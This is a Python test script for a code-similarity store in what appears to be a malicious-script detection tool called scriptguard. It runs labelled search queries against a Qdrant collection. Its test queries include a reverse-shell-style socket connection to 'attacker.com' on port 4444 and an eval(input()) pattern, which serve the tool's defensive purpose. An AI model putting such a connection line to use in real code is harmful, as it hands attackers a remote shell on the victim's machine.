"""
Test API RAG fix - verify code_samples collection integration.
"""

import os
import sys
from dotenv import load_dotenv

load_dotenv()

# Add src to path
sys.path.insert(0, os.path.join(os.path.dirname(__file__), 'src'))

from scriptguard.config_loader import load_config
from scriptguard.rag.code_similarity_store import CodeSimilarityStore
from scriptguard.utils.logger import logger

def test_code_similarity_store():
    """Test CodeSimilarityStore connection and search."""
    print("\n" + "=" * 60)
    print("Testing CodeSimilarityStore Integration")
    print("=" * 60)

    # Load config
    config = load_config("config.yaml")
    qdrant_cfg = config.qdrant
    code_emb_cfg = config.code_embedding

    print(f"\nConfig:")
    print(f"  Collection: {qdrant_cfg.collection_name}")
    print(f"  Embedding Model: {qdrant_cfg.embedding_model}")
    print(f"  Host: {qdrant_cfg.host}:{qdrant_cfg.port}")

    # Initialize store
    try:
        store = CodeSimilarityStore(
            host=qdrant_cfg.host,
            port=qdrant_cfg.port,
            collection_name=qdrant_cfg.collection_name,
            embedding_model=qdrant_cfg.embedding_model,
            pooling_strategy=code_emb_cfg.pooling_strategy if hasattr(code_emb_cfg, 'pooling_strategy') else "mean_pooling",
            normalize=code_emb_cfg.normalize if hasattr(code_emb_cfg, 'normalize') else True,
            api_key=qdrant_cfg.api_key,
            use_https=qdrant_cfg.use_https,
            enable_chunking=False
        )

        # Get collection info
        info = store.get_collection_info()
        print(f"\n✅ Connected to collection:")
        print(f"  Name: {info.get('name')}")
        print(f"  Points: {info.get('points_count')}")
        print(f"  Vector Size: {info.get('vector_size')}")
        print(f"  Status: {info.get('status')}")

        # Test search
        print("\n" + "=" * 60)
        print("Testing Search")
        print("=" * 60)

        test_queries = [
            "import socket; s = socket.socket(); s.connect(('attacker.com', 4444))",
            "eval(input('Enter code: '))",
            "import requests; requests.get('http://example.com')"
        ]

        for i, query in enumerate(test_queries, 1):
            print(f"\nQuery {i}: {query[:60]}...")

            try:
                results = store.search_similar_code(
                    query_code=query,
                    k=3,
                    balance_labels=False,
                    enable_reranking=True,
                    fetch_full_content=False,
                    aggregate_chunks=True
                )

                print(f"  Results: {len(results)}")

                for j, result in enumerate(results, 1):
                    payload = result.get('payload', {})
                    score = result.get('score', 0.0)
                    label = payload.get('label', 'unknown')
                    preview = payload.get('code_preview', '')[:80]

                    print(f"    {j}. Score: {score:.4f} | Label: {label}")
                    print(f"       Preview: {preview}...")

                if len(results) == 0:
                    print("    ❌ No results returned!")
                else:
                    print(f"    ✅ Search successful!")

            except Exception as e:
                print(f"    ❌ Search failed: {e}")
                import traceback
                traceback.print_exc()

        print("\n" + "=" * 60)
        print("Test Complete")
        print("=" * 60)

    except Exception as e:
        logger.error(f"Failed to initialize store: {e}", exc_info=True)
        return False

    return True


if __name__ == "__main__":
    success = test_code_similarity_store()
    sys.exit(0 if success else 1)
